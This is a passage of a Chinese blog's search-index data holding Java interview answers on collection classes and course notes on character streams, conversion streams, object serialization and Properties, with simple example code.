有什么区别？ java.util.Collection 是一个集合接口（集合类的一个顶级接口）。它提供了对集合对象进行基本操作的通用接口方法。Collection接口在Java 类库中有很多具体的实现。Collection接口的意义是为各种具体的集合提供了最大化的统一操作方式，其直接继承接口有List与Set。 Collections则是集合类的一个工具类/帮助类，其中提供了一系列静态方法，用于对集合中元素进行排序、搜索以及线程安全等各种操作。 ","date":"2021-07-19","objectID":"/posts/%E5%AE%B9%E5%99%A8-%E4%BA%8C/:1:2","tags":["java容器"],"title":"容器 二","uri":"/posts/%E5%AE%B9%E5%99%A8-%E4%BA%8C/"},{"categories":["java面试"],"content":"20. List、Set、Map 之间的区别是什么？ ","date":"2021-07-19","objectID":"/posts/%E5%AE%B9%E5%99%A8-%E4%BA%8C/:1:3","tags":["java容器"],"title":"容器 二","uri":"/posts/%E5%AE%B9%E5%99%A8-%E4%BA%8C/"},{"categories":["java面试"],"content":"21. HashMap 和 Hashtable 有什么区别？ hashMap去掉了HashTable 的contains方法，但是加上了containsValue（）和containsKey（）方法。 hashTable同步的，而HashMap是非同步的，效率上比hashTable要高。 hashMap允许空键值，而hashTable不允许。 ","date":"2021-07-19","objectID":"/posts/%E5%AE%B9%E5%99%A8-%E4%BA%8C/:1:4","tags":["java容器"],"title":"容器 二","uri":"/posts/%E5%AE%B9%E5%99%A8-%E4%BA%8C/"},{"categories":["java面试"],"content":"22. 如何决定使用 HashMap 还是 TreeMap？ 对于在Map中插入、删除和定位元素这类操作，HashMap是最好的选择。然而，假如你需要对一个有序的key集合进行遍历，TreeMap是更好的选择。基于你的collection的大小，也许向HashMap中添加元素会更快，将map换为TreeMap进行有序key的遍历。 ","date":"2021-07-19","objectID":"/posts/%E5%AE%B9%E5%99%A8-%E4%BA%8C/:1:5","tags":["java容器"],"title":"容器 二","uri":"/posts/%E5%AE%B9%E5%99%A8-%E4%BA%8C/"},{"categories":["java面试"],"content":"23. 说一下 HashMap 的实现原理？ HashMap概述： HashMap是基于哈希表的Map接口的非同步实现。此实现提供所有可选的映射操作，并允许使用null值和null键。此类不保证映射的顺序，特别是它不保证该顺序恒久不变。 HashMap的数据结构： 在java编程语言中，最基本的结构就是两种，一个是数组，另外一个是模拟指针（引用），所有的数据结构都可以用这两个基本结构来构造的，HashMap也不例外。HashMap实际上是一个“链表散列”的数据结构，即数组和链表的结合体。 当我们往Hashmap中put元素时,首先根据key的hashcode重新计算hash值,根绝hash值得到这个元素在数组中的位置(下标),如果该数组在该位置上已经存放了其他元素,那么在这个位置上的元素将以链表的形式存放,新加入的放在链头,最先加入的放入链尾.如果数组中该位置没有元素,就直接将该元素放到数组的该位置上。 需要注意Jdk 1.8中对HashMap的实现做了优化,当链表中的节点数据超过八个之后,该链表会转为红黑树来提高查询效率,从原来的O(n)到O(logn) ","date":"2021-07-19","objectID":"/posts/%E5%AE%B9%E5%99%A8-%E4%BA%8C/:1:6","tags":["java容器"],"title":"容器 二","uri":"/posts/%E5%AE%B9%E5%99%A8-%E4%BA%8C/"},{"categories":["java面试"],"content":"24. 说一下 HashSet 的实现原理？ HashSet底层由HashMap实现 HashSet的值存放于HashMap的key上 HashMap的value统一为PRESENT ","date":"2021-07-19","objectID":"/posts/%E5%AE%B9%E5%99%A8-%E4%BA%8C/:1:7","tags":["java容器"],"title":"容器 二","uri":"/posts/%E5%AE%B9%E5%99%A8-%E4%BA%8C/"},{"categories":["java面试"],"content":"25. ArrayList 和 LinkedList 的区别是什么？ 最明显的区别是 ArrrayList底层的数据结构是数组，支持随机访问，而 LinkedList 的底层数据结构是双向循环链表，不支持随机访问。使用下标访问一个元素，ArrayList 的时间复杂度是 O(1)，而 LinkedList 是 O(n)。 ","date":"2021-07-19","objectID":"/posts/%E5%AE%B9%E5%99%A8-%E4%BA%8C/:1:8","tags":["java容器"],"title":"容器 二","uri":"/posts/%E5%AE%B9%E5%99%A8-%E4%BA%8C/"},{"categories":["java面试"],"content":"26. 如何实现数组和 List 之间的转换？ List转换成为数组：调用ArrayList的toArray方法。 数组转换成为List：调用Arrays的asList方法。 ","date":"2021-07-19","objectID":"/posts/%E5%AE%B9%E5%99%A8-%E4%BA%8C/:1:9","tags":["java容器"],"title":"容器 二","uri":"/posts/%E5%AE%B9%E5%99%A8-%E4%BA%8C/"},{"categories":["java面试"],"content":"27. ArrayList 和 Vector 的区别是什么？ Vector是同步的，而ArrayList不是。然而，如果你寻求在迭代的时候对列表进行改变，你应该使用CopyOnWriteArrayList。 ArrayList比Vector快，它因为有同步，不会过载。 ArrayList更加通用，因为我们可以使用Collections工具类轻易地获取同步列表和只读列表。 ","date":"2021-07-19","objectID":"/posts/%E5%AE%B9%E5%99%A8-%E4%BA%8C/:1:10","tags":["java容器"],"title":"容器 二","uri":"/posts/%E5%AE%B9%E5%99%A8-%E4%BA%8C/"},{"categories":["java面试"],"content":"28. Array 和 ArrayList 有何区别？ Array可以容纳基本类型和对象，而ArrayList只能容纳对象。 Array是指定大小后不可变的，而ArrayList大小是可变的。 Array没有提供ArrayList那么多功能，比如addAll、removeAll和iterator等。 ","date":"2021-07-19","objectID":"/posts/%E5%AE%B9%E5%99%A8-%E4%BA%8C/:1:11","tags":["java容器"],"title":"容器 二","uri":"/posts/%E5%AE%B9%E5%99%A8-%E4%BA%8C/"},{"categories":["java面试"],"content":"29. 在 Queue 中 poll()和 remove()有什么区别？ poll() 和 remove() 都是从队列中取出一个元素，但是 poll() 在获取元素失败的时候会返回空，但是 remove() 失败的时候会抛出异常。 ","date":"2021-07-19","objectID":"/posts/%E5%AE%B9%E5%99%A8-%E4%BA%8C/:1:12","tags":["java容器"],"title":"容器 二","uri":"/posts/%E5%AE%B9%E5%99%A8-%E4%BA%8C/"},{"categories":["java面试"],"content":"30. 哪些集合类是线程安全的？ vector：就比arraylist多了个同步化机制（线程安全），因为效率较低，现在已经不太建议使用。在web应用中，特别是前台页面，往往效率（页面响应速度）是优先考虑的。 statck：堆栈类，先进后出。 hashtable：就比hashmap多了个线程安全。 enumeration：枚举，相当于迭代器。 ","date":"2021-07-19","objectID":"/posts/%E5%AE%B9%E5%99%A8-%E4%BA%8C/:1:13","tags":["java容器"],"title":"容器 二","uri":"/posts/%E5%AE%B9%E5%99%A8-%E4%BA%8C/"},{"categories":["java面试"],"content":"31. 迭代器 Iterator 是什么？ 迭代器是一种设计模式，它是一个对象，它可以遍历并选择序列中的对象，而开发人员不需要了解该序列的底层结构。迭代器通常被称为“轻量级”对象，因为创建它的代价小。 ","date":"2021-07-19","objectID":"/posts/%E5%AE%B9%E5%99%A8-%E4%BA%8C/:1:14","tags":["java容器"],"title":"容器 二","uri":"/posts/%E5%AE%B9%E5%99%A8-%E4%BA%8C/"},{"categories":["java面试"],"content":"32. Iterator 怎么使用？有什么特点？ Java中的Iterator功能比较简单，并且只能单向移动： (1) 使用方法iterator()要求容器返回一个Iterator。第一次调用Iterator的next()方法时，它返回序列的第一个元素。注意：iterator()方法是java.lang.Iterable接口,被Collection继承。 (2) 使用next()获得序列中的下一个元素。 (3) 使用hasNext()检查序列中是否还有元素。 (4) 使用remove()将迭代器新返回的元素删除。　Iterator是Java迭代器最简单的实现，为List设计的ListIterator具有更多的功能，它可以从两个方向遍历List，也可以从List中插入和删除元素。 ","date":"2021-07-19","objectID":"/posts/%E5%AE%B9%E5%99%A8-%E4%BA%8C/:1:15","tags":["java容器"],"title":"容器 二","uri":"/posts/%E5%AE%B9%E5%99%A8-%E4%BA%8C/"},{"categories":["java面试"],"content":"33. Iterator 和 ListIterator 有什么区别？ Iterator可用来遍历Set和List集合，但是ListIterator只能用来遍历List。 Iterator对集合只能是前向遍历，ListIterator既可以前向也可以后向。 ListIterator实现了Iterator接口，并包含其他的功能，比如：增加元素，替换元素，获取前一个和后一个元素的索引，等等。 原文地址：https://blog.csdn.net/sufu1065/article/details/88051083 ","date":"2021-07-19","objectID":"/posts/%E5%AE%B9%E5%99%A8-%E4%BA%8C/:1:16","tags":["java容器"],"title":"容器 二","uri":"/posts/%E5%AE%B9%E5%99%A8-%E4%BA%8C/"},{"categories":["大三下实训笔记"],"content":"字符流-转换流-对象操作流-Properties集合","date":"2021-07-19","objectID":"/posts/file-io-%E4%BA%8C/","tags":[],"title":"File \u0026 IO 二","uri":"/posts/file-io-%E4%BA%8C/"},{"categories":["大三下实训笔记"],"content":"1.字符流 ","date":"2021-07-19","objectID":"/posts/file-io-%E4%BA%8C/:1:0","tags":[],"title":"File \u0026 IO 二","uri":"/posts/file-io-%E4%BA%8C/"},{"categories":["大三下实训笔记"],"content":"1.1为什么会出现字符流【理解】 字符流的介绍 由于字节流操作中文不是特别的方便，所以Java就提供字符流 字符流 = 字节流 + 编码表 中文的字节存储方式 用字节流复制文本文件时，文本文件也会有中文，但是没有问题，原因是最终底层操作会自动进行字节拼接成中文，如何识别是中文的呢？ 汉字在存储的时候，无论选择哪种编码存储，第一个字节都是负数 ","date":"2021-07-19","objectID":"/posts/file-io-%E4%BA%8C/:1:1","tags":[],"title":"File \u0026 IO 二","uri":"/posts/file-io-%E4%BA%8C/"},{"categories":["大三下实训笔记"],"content":"1.2编码表【理解】 什么是字符集 是一个系统支持的所有字符的集合，包括各国家文字、标点符号、图形符号、数字等 l计算机要准确的存储和识别各种字符集符号，就需要进行字符编码，一套字符集必然至少有一套字符编码。常见字符集有ASCII字符集、GBXXX字符集、Unicode字符集等 常见的字符集 ASCII字符集： lASCII：是基于拉丁字母的一套电脑编码系统，用于显示现代英语，主要包括控制字符(回车键、退格、换行键等)和可显示字符(英文大小写字符、阿拉伯数字和西文符号) 基本的ASCII字符集，使用7位表示一个字符，共128字符。ASCII的扩展字符集使用8位表示一个字符，共256字符，方便支持欧洲常用字符。是一个系统支持的所有字符的集合，包括各国家文字、标点符号、图形符号、数字等 GBXXX字符集： GBK：最常用的中文码表。是在GB2312标准基础上的扩展规范，使用了双字节编码方案，共收录了21003个汉字，完全兼容GB2312标准，同时支持繁体汉字以及日韩汉字等 Unicode字符集： UTF-8编码：可以用来表示Unicode标准中任意字符，它是电子邮件、网页及其他存储或传送文字的应用 中，优先采用的编码。互联网工程工作小组（IETF）要求所有互联网协议都必须支持UTF-8编码。它使用一至四个字节为每个字符编码 编码规则： 128个US-ASCII字符，只需一个字节编码 拉丁文等字符，需要二个字节编码 大部分常用字（含中文），使用三个字节编码 其他极少使用的Unicode辅助字符，使用四字节编码 ","date":"2021-07-19","objectID":"/posts/file-io-%E4%BA%8C/:1:2","tags":[],"title":"File \u0026 IO 二","uri":"/posts/file-io-%E4%BA%8C/"},{"categories":["大三下实训笔记"],"content":"1.3字符串中的编码解码问题【应用】 相关方法 方法名 说明 byte[] getBytes() 使用平台的默认字符集将该 String编码为一系列字节 byte[] getBytes(String charsetName) 使用指定的字符集将该 String编码为一系列字节 String(byte[] bytes) 使用平台的默认字符集解码指定的字节数组来创建字符串 String(byte[] bytes, String charsetName) 通过指定的字符集解码指定的字节数组来创建字符串 代码演示 public class StringDemo { public static void main(String[] args) throws UnsupportedEncodingException { //定义一个字符串 String s = \"中国\"; //byte[] bys = s.getBytes(); //[-28, -72, -83, -27, -101, -67] //byte[] bys = s.getBytes(\"UTF-8\"); //[-28, -72, -83, -27, -101, -67] byte[] bys = s.getBytes(\"GBK\"); //[-42, -48, -71, -6] System.out.println(Arrays.toString(bys)); //String ss = new String(bys); //String ss = new String(bys,\"UTF-8\"); String ss = new String(bys,\"GBK\"); System.out.println(ss); } } ","date":"2021-07-19","objectID":"/posts/file-io-%E4%BA%8C/:1:3","tags":[],"title":"File \u0026 IO 二","uri":"/posts/file-io-%E4%BA%8C/"},{"categories":["大三下实训笔记"],"content":"1.4字符流写数据【应用】 介绍 Writer: 用于写入字符流的抽象父类 FileWriter: 用于写入字符流的常用子类 构造方法 方法名 说明 FileWriter(File file) 根据给定的 File 对象构造一个 FileWriter 对象 FileWriter(File file, boolean append) 根据给定的 File 对象构造一个 FileWriter 对象 FileWriter(String fileName) 根据给定的文件名构造一个 FileWriter 对象 FileWriter(String fileName, boolean append) 根据给定的文件名以及指示是否附加写入数据的 boolean 值来构造 FileWriter 对象 成员方法 方法名 说明 void write(int c) 写一个字符 void write(char[] cbuf) 写入一个字符数组 void write(char[] cbuf, int off, int len) 写入字符数组的一部分 void write(String str) 写一个字符串 void write(String str, int off, int len) 写一个字符串的一部分 刷新和关闭的方法 方法名 说明 flush() 刷新流，之后还可以继续写数据 close() 关闭流，释放资源，但是在关闭之前会先刷新流。一旦关闭，就不能再写数据 代码演示 public class OutputStreamWriterDemo { public static void main(String[] args) throws IOException { FileWriter fw = new FileWriter(\"myCharStream\\\\a.txt\"); //void write(int c)：写一个字符 // fw.write(97); // fw.write(98); // fw.write(99); //void writ(char[] cbuf)：写入一个字符数组 char[] chs = {'a', 'b', 'c', 'd', 'e'}; // fw.write(chs); //void write(char[] cbuf, int off, int len)：写入字符数组的一部分 // fw.write(chs, 0, chs.length); // fw.write(chs, 1, 3); //void write(String str)：写一个字符串 // fw.write(\"abcde\"); //void write(String str, int off, int len)：写一个字符串的一部分 // fw.write(\"abcde\", 0, \"abcde\".length()); fw.write(\"abcde\", 1, 3); //释放资源 fw.close(); } } ","date":"2021-07-19","objectID":"/posts/file-io-%E4%BA%8C/:1:4","tags":[],"title":"File \u0026 IO 二","uri":"/posts/file-io-%E4%BA%8C/"},{"categories":["大三下实训笔记"],"content":"1.5字符流读数据【应用】 介绍 Reader: 用于读取字符流的抽象父类 FileReader: 用于读取字符流的常用子类 构造方法 方法名 说明 FileReader(File file) 在给定从中读取数据的 File 的情况下创建一个新 FileReader FileReader(String fileName) 在给定从中读取数据的文件名的情况下创建一个新 FileReader 成员方法 方法名 说明 int read() 一次读一个字符数据 int read(char[] cbuf) 一次读一个字符数组数据 代码演示 public class InputStreamReaderDemo { public static void main(String[] args) throws IOException { FileReader fr = new FileReader(\"myCharStream\\\\b.txt\"); //int read()：一次读一个字符数据 // int ch; // while ((ch=fr.read())!=-1) { // System.out.print((char)ch); // } //int read(char[] cbuf)：一次读一个字符数组数据 char[] chs = new char[1024]; int len; while ((len = fr.read(chs)) != -1) { System.out.print(new String(chs, 0, len)); } //释放资源 fr.close(); } } ","date":"2021-07-19","objectID":"/posts/file-io-%E4%BA%8C/:1:5","tags":[],"title":"File \u0026 IO 二","uri":"/posts/file-io-%E4%BA%8C/"},{"categories":["大三下实训笔记"],"content":"1.6字符流用户注册案例【应用】 案例需求 将键盘录入的用户名和密码保存到本地实现永久化存储 实现步骤 获取用户输入的用户名和密码 将用户输入的用户名和密码写入到本地文件中 关流,释放资源 代码实现 public class CharStreamDemo8 { public static void main(String[] args) throws IOException { //需求: 将键盘录入的用户名和密码保存到本地实现永久化存储 //要求：用户名独占一行，密码独占一行 //分析： //1，实现键盘录入，把用户名和密码录入进来 Scanner sc = new Scanner(System.in); System.out.println(\"请录入用户名\"); String username = sc.next(); System.out.println(\"请录入密码\"); String password = sc.next(); //2.分别把用户名和密码写到本地文件。 FileWriter fw = new FileWriter(\"charstream\\\\a.txt\"); //将用户名和密码写到文件中 fw.write(username); //表示写出一个回车换行符 windows \\r\\n MacOS \\r Linux \\n fw.write(\"\\r\\n\"); fw.write(password); //刷新流 fw.flush(); //3.关流,释放资源 fw.close(); } } ","date":"2021-07-19","objectID":"/posts/file-io-%E4%BA%8C/:1:6","tags":[],"title":"File \u0026 IO 二","uri":"/posts/file-io-%E4%BA%8C/"},{"categories":["大三下实训笔记"],"content":"1.7字符缓冲流【应用】 字符缓冲流介绍 BufferedWriter：将文本写入字符输出流，缓冲字符，以提供单个字符，数组和字符串的高效写入，可以指定缓冲区大小，或者可以接受默认大小。默认值足够大，可用于大多数用途 BufferedReader：从字符输入流读取文本，缓冲字符，以提供字符，数组和行的高效读取，可以指定缓冲区大小，或者可以使用默认大小。 默认值足够大，可用于大多数用途 构造方法 方法名 说明 BufferedWriter(Writer out) 创建字符缓冲输出流对象 BufferedReader(Reader in) 创建字符缓冲输入流对象 代码演示 public class BufferedStreamDemo01 { public static void main(String[] args) throws IOException { //BufferedWriter(Writer out) BufferedWriter bw = new BufferedWriter(new FileWriter(\"myCharStream\\\\bw.txt\")); bw.write(\"hello\\r\\n\"); bw.write(\"world\\r\\n\"); bw.close(); //BufferedReader(Reader in) BufferedReader br = new BufferedReader(new FileReader(\"myCharStream\\\\bw.txt\")); //一次读取一个字符数据 // int ch; // while ((ch=br.read())!=-1) { // System.out.print((char)ch); // } //一次读取一个字符数组数据 char[] chs = new char[1024]; int len; while ((len=br.read(chs))!=-1) { System.out.print(new String(chs,0,len)); } br.close(); } } ","date":"2021-07-19","objectID":"/posts/file-io-%E4%BA%8C/:1:7","tags":[],"title":"File \u0026 IO 二","uri":"/posts/file-io-%E4%BA%8C/"},{"categories":["大三下实训笔记"],"content":"1.8字符缓冲流特有功能【应用】 方法介绍 BufferedWriter： 方法名 说明 void newLine() 写一行行分隔符，行分隔符字符串由系统属性定义 BufferedReader: 方法名 说明 String readLine() 读一行文字。 结果包含行的内容的字符串，不包括任何行终止字符如果流的结尾已经到达，则为null 代码演示 public class BufferedStreamDemo02 { public static void main(String[] args) throws IOException { //创建字符缓冲输出流 BufferedWriter bw = new BufferedWriter(new FileWriter(\"myCharStream\\\\bw.txt\")); //写数据 for (int i = 0; i \u003c 10; i++) { bw.write(\"hello\" + i); //bw.write(\"\\r\\n\"); bw.newLine(); bw.flush(); } //释放资源 bw.close(); //创建字符缓冲输入流 BufferedReader br = new BufferedReader(new FileReader(\"myCharStream\\\\bw.txt\")); String line; while ((line=br.readLine())!=null) { System.out.println(line); } br.close(); } } ","date":"2021-07-19","objectID":"/posts/file-io-%E4%BA%8C/:1:8","tags":[],"title":"File \u0026 IO 二","uri":"/posts/file-io-%E4%BA%8C/"},{"categories":["大三下实训笔记"],"content":"1.9字符缓冲流操作文件中数据排序案例【应用】 案例需求 使用字符缓冲流读取文件中的数据，排序后再次写到本地文件 实现步骤 将文件中的数据读取到程序中 对读取到的数据进行处理 将处理后的数据添加到集合中 对集合中的数据进行排序 将排序后的集合中的数据写入到文件中 代码实现 public class CharStreamDemo14 { public static void main(String[] args) throws IOException { //需求：读取文件中的数据，排序后再次写到本地文件 //分析： //1.要把文件中的数据读取进来。 BufferedReader br = new BufferedReader(new FileReader(\"charstream\\\\sort.txt\")); //输出流一定不能写在这里，因为会清空文件中的内容 //BufferedWriter bw = new BufferedWriter(new FileWriter(\"charstream\\\\sort.txt\")); String line = br.readLine(); System.out.println(\"读取到的数据为\" + line); br.close(); //2.按照空格进行切割 String[] split = line.split(\" \");//9 1 2 5 3 10 4 6 7 8 //3.把字符串类型的数组变成int类型 int [] arr = new int[split.length]; //遍历split数组，可以进行类型转换。 for (int i = 0; i \u003c split.length; i++) { String smallStr = split[i]; //类型转换 int number = Integer.parseInt(smallStr); //把转换后的结果存入到arr中 arr[i] = number; } //4.排序 Arrays.sort(arr); System.out.println(Arrays.toString(arr)); //5.把排序之后结果写回到本地 1 2 3 4... BufferedWriter bw = new BufferedWriter(new FileWriter(\"charstream\\\\sort.txt\")); //写出 for (int i = 0; i \u003c arr.length; i++) { bw.write(arr[i] + \" \"); bw.flush(); } //释放资源 bw.close(); } } ","date":"2021-07-19","objectID":"/posts/file-io-%E4%BA%8C/:1:9","tags":[],"title":"File \u0026 IO 二","uri":"/posts/file-io-%E4%BA%8C/"},{"categories":["大三下实训笔记"],"content":"1.10IO流小结【理解】 IO流小结 ","date":"2021-07-19","objectID":"/posts/file-io-%E4%BA%8C/:1:10","tags":[],"title":"File \u0026 IO 二","uri":"/posts/file-io-%E4%BA%8C/"},{"categories":["大三下实训笔记"],"content":"2.转换流 ","date":"2021-07-19","objectID":"/posts/file-io-%E4%BA%8C/:2:0","tags":[],"title":"File \u0026 IO 二","uri":"/posts/file-io-%E4%BA%8C/"},{"categories":["大三下实训笔记"],"content":"2.1字符流中和编码解码问题相关的两个类【理解】 InputStreamReader：是从字节流到字符流的桥梁,父类是Reader ​ 它读取字节，并使用指定的编码将其解码为字符 ​ 它使用的字符集可以由名称指定，也可以被明确指定，或者可以接受平台的默认字符集 OutputStreamWriter：是从字符流到字节流的桥梁,父类是Writer ​ 是从字符流到字节流的桥梁，使用指定的编码将写入的字符编码为字节 ​ 它使用的字符集可以由名称指定，也可以被明确指定，或者可以接受平台的默认字符集 ","date":"2021-07-19","objectID":"/posts/file-io-%E4%BA%8C/:2:1","tags":[],"title":"File \u0026 IO 二","uri":"/posts/file-io-%E4%BA%8C/"},{"categories":["大三下实训笔记"],"content":"2.2转换流读写数据【应用】 构造方法 方法名 说明 InputStreamReader(InputStream in) 使用默认字符编码创建InputStreamReader对象 InputStreamReader(InputStream in,String chatset) 使用指定的字符编码创建InputStreamReader对象 OutputStreamWriter(OutputStream out) 使用默认字符编码创建OutputStreamWriter对象 OutputStreamWriter(OutputStream out,String charset) 使用指定的字符编码创建OutputStreamWriter对象 代码演示 public class ConversionStreamDemo { public static void main(String[] args) throws IOException { //OutputStreamWriter osw = new OutputStreamWriter(new FileOutputStream(\"myCharStream\\\\osw.txt\")); OutputStreamWriter osw = new OutputStreamWriter(new FileOutputStream(\"myCharStream\\\\osw.txt\"),\"GBK\"); osw.write(\"中国\"); osw.close(); //InputStreamReader isr = new InputStreamReader(new FileInputStream(\"myCharStream\\\\osw.txt\")); InputStreamReader isr = new InputStreamReader(new FileInputStream(\"myCharStream\\\\osw.txt\"),\"GBK\"); //一次读取一个字符数据 int ch; while ((ch=isr.read())!=-1) { System.out.print((char)ch); } isr.close(); } } ","date":"2021-07-19","objectID":"/posts/file-io-%E4%BA%8C/:2:2","tags":[],"title":"File \u0026 IO 二","uri":"/posts/file-io-%E4%BA%8C/"},{"categories":["大三下实训笔记"],"content":"3.对象操作流 ","date":"2021-07-19","objectID":"/posts/file-io-%E4%BA%8C/:3:0","tags":[],"title":"File \u0026 IO 二","uri":"/posts/file-io-%E4%BA%8C/"},{"categories":["大三下实训笔记"],"content":"3.1对象序列化流【应用】 对象序列化介绍 对象序列化：就是将对象保存到磁盘中，或者在网络中传输对象 这种机制就是使用一个字节序列表示一个对象，该字节序列包含：对象的类型、对象的数据和对象中存储的属性等信息 字节序列写到文件之后，相当于文件中持久保存了一个对象的信息 反之，该字节序列还可以从文件中读取回来，重构对象，对它进行反序列化 对象序列化流： ObjectOutputStream 将Java对象的原始数据类型和图形写入OutputStream。 可以使用ObjectInputStream读取（重构）对象。 可以通过使用流的文件来实现对象的持久存储。 如果流是网络套接字流，则可以在另一个主机上或另一个进程中重构对象 构造方法 方法名 说明 ObjectOutputStream(OutputStream out) 创建一个写入指定的OutputStream的ObjectOutputStream 序列化对象的方法 方法名 说明 void writeObject(Object obj) 将指定的对象写入ObjectOutputStream 示例代码 学生类 public class Student implements Serializable { private String name; private int age; public Student() { } public Student(String name, int age) { this.name = name; this.age = age; } public String getName() { return name; } public void setName(String name) { this.name = name; } public int getAge() { return age; } public void setAge(int age) { this.age = age; } @Override public String toString() { return \"Student{\" + \"name='\" + name + '\\'' + \", age=\" + age + '}'; } } 测试类 public class ObjectOutputStreamDemo { public static void main(String[] args) throws IOException { //ObjectOutputStream(OutputStream out)：创建一个写入指定的OutputStream的ObjectOutputStream ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"myOtherStream\\\\oos.txt\")); //创建对象 Student s = new Student(\"佟丽娅\",30); //void writeObject(Object obj)：将指定的对象写入ObjectOutputStream oos.writeObject(s); //释放资源 oos.close(); } } 注意事项 一个对象要想被序列化，该对象所属的类必须必须实现Serializable 接口 Serializable是一个标记接口，实现该接口，不需要重写任何方法 ","date":"2021-07-19","objectID":"/posts/file-io-%E4%BA%8C/:3:1","tags":[],"title":"File \u0026 IO 二","uri":"/posts/file-io-%E4%BA%8C/"},{"categories":["大三下实训笔记"],"content":"3.2对象反序列化流【应用】 对象反序列化流： ObjectInputStream ObjectInputStream反序列化先前使用ObjectOutputStream编写的原始数据和对象 构造方法 方法名 说明 ObjectInputStream(InputStream in) 创建从指定的InputStream读取的ObjectInputStream 反序列化对象的方法 方法名 说明 Object readObject() 从ObjectInputStream读取一个对象 示例代码 public class ObjectInputStreamDemo { public static void main(String[] args) throws IOException, ClassNotFoundException { //ObjectInputStream(InputStream in)：创建从指定的InputStream读取的ObjectInputStream ObjectInputStream ois = new ObjectInputStream(new FileInputStream(\"myOtherStream\\\\oos.txt\")); //Object readObject()：从ObjectInputStream读取一个对象 Object obj = ois.readObject(); Student s = (Student) obj; System.out.println(s.getName() + \",\" + s.getAge()); ois.close(); } } ","date":"2021-07-19","objectID":"/posts/file-io-%E4%BA%8C/:3:2","tags":[],"title":"File \u0026 IO 二","uri":"/posts/file-io-%E4%BA%8C/"},{"categories":["大三下实训笔记"],"content":"3.3serialVersionUID\u0026transient【应用】 serialVersionUID 用对象序列化流序列化了一个对象后，假如我们修改了对象所属的类文件，读取数据会不会出问题呢？ 会出问题，会抛出InvalidClassException异常 如果出问题了，如何解决呢？ 重新序列化 给对象所属的类加一个serialVersionUID private static final long serialVersionUID = 42L; transient 如果一个对象中的某个成员变量的值不想被序列化，又该如何实现呢？ 给该成员变量加transient关键字修饰，该关键字标记的成员变量不参与序列化过程 示例代码 学生类 public class Student implements Serializable { private static final long serialVersionUID = 42L; private String name; // private int age; private transient int age; public Student() { } public Student(String name, int age) { this.name = name; this.age = age; } public String getName() { return name; } public void setName(String name) { this.name = name; } public int getAge() { return age; } public void setAge(int age) { this.age = age; } // @Override // public String toString() { // return \"Student{\" + // \"name='\" + name + '\\'' + // \", age=\" + age + // '}'; // } } 测试类 public class ObjectStreamDemo { public static void main(String[] args) throws IOException, ClassNotFoundException { // write(); read(); } //反序列化 private static void read() throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(\"myOtherStream\\\\oos.txt\")); Object obj = ois.readObject(); Student s = (Student) obj; System.out.println(s.getName() + \",\" + s.getAge()); ois.close(); } //序列化 private static void write() throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"myOtherStream\\\\oos.txt\")); Student s = new Student(\"佟丽娅\", 30); oos.writeObject(s); oos.close(); } } ","date":"2021-07-19","objectID":"/posts/file-io-%E4%BA%8C/:3:3","tags":[],"title":"File \u0026 IO 二","uri":"/posts/file-io-%E4%BA%8C/"},{"categories":["大三下实训笔记"],"content":"3.4对象操作流练习【应用】 案例需求 创建多个学生类对象写到文件中,再次读取到内存中 实现步骤 创建序列化流对象 创建多个学生对象 将学生对象添加到集合中 将集合对象序列化到文件中 创建反序列化流对象 将文件中的对象数据,读取到内存中 代码实现 学生类 public class Student implements Serializable{ private static final long serialVersionUID = 2L; private String name; private int age; public Student() { } public Student(String name, int age) { this.name = name; this.age = age; } public String getName() { return name; } public void setName(String name) { this.name = name; } public int getAge() { return age; } public void setAge(int age) { this.age = age; } } 测试类 public class Demo03 { /** * read(): * 读取到文件末尾返回值是 -1 * readLine(): * 读取到文件的末尾返回值 null * readObject(): * 读取到文件的末尾 直接抛出异常 * 如果要序列化的对象有多个,不建议直接将多个对象序列化到文件中,因为反序列化时容易出异常 * 建议: 将要序列化的多个对象存储到集合中,然后将集合序列化到文件中 */ public static void main(String[] args) throws Exception { /*// 序列化 //1.创建序列化流对象 ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"myCode\\\\oos.txt\")); ArrayList\u003cStudent\u003e arrayList = new ArrayList\u003c\u003e(); //2.创建多个学生对象 Student s = new Student(\"佟丽娅\",30); Student s01 = new Student(\"佟丽娅\",30); //3.将学生对象添加到集合中 arrayList.add(s); arrayList.add(s01); //4.将集合对象序列化到文件中 oos.writeObject(arrayList); oos.close();*/ // 反序列化 //5.创建反序列化流对象 ObjectInputStream ois = new ObjectInputStream(new FileInputStream(\"myCode\\\\oos.txt\")); //6.将文件中的对象数据,读取到内存中 Object obj = ois.readObject(); ArrayList\u003cStudent\u003e arrayList = (ArrayList\u003cStudent\u003e)obj; ois.close(); for (Student s : arrayList) { System.out.println(s.getName() + \",\" + s.getAge()); } } } ","date":"2021-07-19","objectID":"/posts/file-io-%E4%BA%8C/:3:4","tags":[],"title":"File \u0026 IO 二","uri":"/posts/file-io-%E4%BA%8C/"},{"categories":["大三下实训笔记"],"content":"4.Properties集合 ","date":"2021-07-19","objectID":"/posts/file-io-%E4%BA%8C/:4:0","tags":[],"title":"File \u0026 IO 二","uri":"/posts/file-io-%E4%BA%8C/"},{"categories":["大三下实训笔记"],"content":"4.1Properties作为Map集合的使用【应用】 Properties介绍 是一个Map体系的集合类 Properties可以保存到流中或从流中加载 属性列表中的每个键及其对应的值都是一个字符串 Properties基本使用 public class PropertiesDemo01 { public static void main(String[] args) { //创建集合对象 // Properties\u003cString,String\u003e prop = new Properties\u003cString,String\u003e(); //错误 Properties prop = new Properties(); //存储元素 prop.put(\"itheima001\", \"佟丽娅\"); prop.put(\"itheima002\", \"赵丽颖\"); prop.put(\"itheima003\", \"刘诗诗\"); //遍历集合 Set\u003cObject\u003e keySet = prop.keySet(); for (Object key : keySet) { Object value = prop.get(key); System.out.println(key + \",\" + value); } } } ","date":"2021-07-19","objectID":"/posts/file-io-%E4%BA%8C/:4:1","tags":[],"title":"File \u0026 IO 二","uri":"/posts/file-io-%E4%BA%8C/"},{"categories":["大三下实训笔记"],"content":"4.2Properties作为Map集合的特有方法【应用】 特有方法 方法名 说明 Object setProperty(String key, String value) 设置集合的键和值，都是String类型，底层调用 Hashtable方法 put String getProperty(String key) 使用此属性列表中指定的键搜索属性 Set stringPropertyNames() 从该属性列表中返回一个不可修改的键集，其中键及其对应的值是字符串 示例代码 public class PropertiesDemo02 { public static void main(String[] args) { //创建集合对象 Properties prop = new Properties(); //Object setProperty(String key, String 